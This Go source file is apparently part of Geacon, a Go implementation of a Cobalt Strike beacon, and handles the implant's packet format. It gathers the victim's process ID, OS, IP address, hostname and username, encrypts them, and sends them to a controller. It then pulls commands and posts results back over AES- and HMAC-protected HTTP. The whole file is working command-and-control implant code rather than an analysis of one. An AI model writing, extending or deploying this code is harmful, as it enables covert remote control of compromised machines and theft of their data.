package packet

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"main/config"
	"main/sysinfo"
	"main/util"
	"strings"
	"time"

	"github.com/imroc/req"
)

var (
	encryptedMetaInfo []byte
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func ReadShort(b []byte) uint16 {
	return binary.BigEndian.Uint16(b)
}

func DecryptPacket(b []byte) []byte {
	decrypted, err := util.AesCBCDecrypt(b, config.AesKey)
	if err != nil {
		panic(err)
	}
	return decrypted
}

func EncryptPacket() {

}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		panic(err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	commandLenBytes := make([]byte, 4)
	_, err = buf.Read(commandLenBytes)
	if err != nil {
		panic(err)
	}
	commandLen := ReadInt(commandLenBytes)
	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		panic(err)
	}
	*totalLen = *totalLen - (4 + 4 + commandLen)
	return commandType, commandBuf

}

// MakePacket make reply command, return AES encoded data
func MakePacket(replyType int, b []byte) []byte {
	config.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte, 4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := util.AesCBCEncrypt(buf.Bytes(), config.AesKey)
	if err != nil {
		return nil
	}
	buf.Reset()

	sendLen := len(encrypted) + util.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := util.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()

}

// EncryptedMetaInfo return raw rsa encrypted data
func EncryptedMetaInfo() []byte {
	// command without computer name
	tempPacket := MakeMetaInfo()
	publicKey, err := util.GetPublicKey()
	// no idea for -11 but just copy from issue#4
	config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11

	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := util.RsaEncrypt(packetUnencrypted, publicKey)
	if err != nil {
		panic(err)
	}
	return packetEncrypted
}

func MakeMetaInfo() []byte {
	util.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]

	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	osVersion := sysinfo.GetOSVersion()
	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIP()
	hostName := sysinfo.GetComputerName()
	currentUser := sysinfo.GetUsername()
	// seems username be like computerName\username, so we split it here
	arr := strings.Split(currentUser, "\\")
	currentUser = arr[len(arr)-1]
	var port uint16 = 0
	metadataFlag := sysinfo.GetMetaDataFlag()

	localeANSI := sysinfo.GetCodePageANSI()
	localeOEM := sysinfo.GetCodePageOEM()

	// onlineInfoBytes : clientIDbytes (bigEnd), processIdbytes(bigEnd), portBytes, osInfoBytes
	//		osInfoBytes: ver, localIP, hostName, currentUser, processName
	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(portBytes, port)

	// osInfoBytes
	// ver,localIP,hostName,currentUser,processName
	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%s", osVersion, localIP, hostName, currentUser, processName)

	// insert port
	osInfoBytes := make([]byte, len([]byte(osInfo))+1)
	osInfoSlicne := []byte(osInfo)
	osInfoBytes = append([]byte{metadataFlag}, osInfoSlicne...)

	fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, portBytes, osInfoBytes)

	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

func FirstBlood() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for {
		_, err := HttpGet(encryptedMetaInfo)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
		}
		fmt.Println("firstblood: ok")
		break
	}
	return true
}

func PullCommand() ([]byte, error) {
	resp, err := HttpGet(encryptedMetaInfo)
	if err != nil {
		fmt.Printf("pull command fail: %s\b", err)
		return nil, err
	}
	return resp, nil
}

func PushResult(b []byte) *req.Resp {
	resp := HttpPost(b)
	return resp
}
